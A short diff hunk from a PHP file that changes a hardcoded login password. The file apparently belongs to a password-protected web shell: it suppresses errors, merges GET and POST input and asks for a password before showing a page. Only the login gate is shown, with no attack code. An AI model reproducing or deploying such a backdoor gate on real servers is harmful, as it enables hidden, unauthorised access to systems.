@@ -9,7 +9,7 @@ error_reporting(0);
 session_start();
 date_default_timezone_set("Asia/Jakarta");
 $nana = array_merge($_POST, $_GET);
-$pwd = "Kolosus-1337";
+$pwd = "Alivos7";
 if(empty($_SESSION['login'])) {
 ?>
 <html>
